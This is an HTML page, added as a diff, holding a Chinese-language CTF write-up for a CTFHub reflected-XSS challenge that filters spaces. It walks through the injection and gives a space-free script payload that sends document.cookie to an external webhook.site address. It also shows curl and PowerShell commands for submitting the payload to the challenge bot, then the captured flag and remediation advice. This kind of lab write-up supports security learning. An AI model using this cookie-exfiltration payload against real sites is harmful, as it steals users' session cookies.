@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub XSS 空格过滤 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; word-break: break-all; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; white-space: pre-wrap; word-break: break-all; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - XSS - 空格过滤</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># XSS</span>
+            <span class="tag"># 空格过滤</span>
+            <span class="tag"># Bot 外带</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>XSS 空格过滤</li>
+            <li><strong>题目方向：</strong>Web - XSS - 反射型</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>绕过空格过滤执行 XSS，将 Bot Cookie 外带并取得 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>访问根路径会重定向到 <code>/?name=CTFHub</code>，并显示欢迎语。输入被直接拼接到 <code>&lt;h1&gt;</code> 标签中：</p>
+        <pre>&lt;h1&gt;Hello, CTFHub
+&lt;/h1&gt;</pre>
+        <p>提交 <code>name=CTFHub%20test</code> 后，空格被直接删除，说明服务端对普通空格进行了过滤。由于其他 HTML 特殊字符未被过滤，可以闭合文本节点并注入无空格的 <code>&lt;script&gt;</code> 载荷。</p>
+        <p class="note">空格过滤不等于 XSS 防护。标签之间或 JavaScript 表达式中通常不需要空格，过滤单个字符无法阻止脚本执行。</p>
+
+        <h2>三、验证反射与脚本执行</h2>
+        <p>先提交不含空格的测试载荷：</p>
+        <pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+        <p>对应请求：</p>
+        <pre>curl.exe -i "http://&lt;target&gt;/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"</pre>
+        <p>响应中可以看到原始标签被反射。页面底部提供 <code>Send URL to Bot</code>，Bot 使用 HeadlessChrome 访问指定 URL，Flag 位于 Bot 可被 JavaScript 读取的 Cookie 中。</p>
+
+        <h2>四、构造外带 Payload</h2>
+        <p>创建临时的公网 Webhook，并将 Cookie 拼接到跳转地址。以下载荷不含空格，可以直接通过过滤：</p>
+        <pre>&lt;script&gt;location='https://webhook.site/&lt;token&gt;/?'+document.cookie&lt;/script&gt;</pre>
+        <p>使用 PowerShell 对 <code>name</code> 参数进行 URL 编码，得到完整的 Bot 访问地址：</p>
+        <pre>$payload = "&lt;script&gt;location='https://webhook.site/&lt;token&gt;/?'+document.cookie&lt;/script&gt;"
+$target = "http://&lt;target&gt;/?name=" + [uri]::EscapeDataString($payload)</pre>
+
+        <h2>五、提交给 Bot</h2>
+        <p>当前环境的 <code>/submit</code> 接口接受表单编码，直接提交 JSON 会返回 <code>400 Bad Request</code>。可用以下命令触发 Bot：</p>
+        <pre>curl.exe -i -X POST --data-urlencode "url=$target" "http://&lt;target&gt;/submit"</pre>
+        <p>触发成功时返回：</p>
+        <pre>{
+  "code": 0,
+  "msg": "Successfully"
+}</pre>
+
+        <h2>六、读取回调</h2>
+        <p>Bot 渲染页面后执行脚本并携带 Cookie 访问 Webhook。回调请求的查询参数中包含 Flag：</p>
+        <pre>GET /?flag=ctfhub{dd80f5eca0ecb2dd3333c1ab}</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{dd80f5eca0ecb2dd3333c1ab}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>根据输出上下文对不可信输入执行 HTML 实体编码，避免直接拼接用户输入。</li>
+            <li>禁止使用字符串黑名单过滤 XSS，应使用成熟的上下文相关编码方案。</li>
+            <li>为敏感 Cookie 设置 <code>HttpOnly</code> 和 <code>SameSite</code>，降低脚本读取与外带风险。</li>
+            <li>配置 CSP，限制内联脚本、外部脚本和未经授权的网络请求。</li>
+        </ul>
+    </div>
+</body>
+</html>
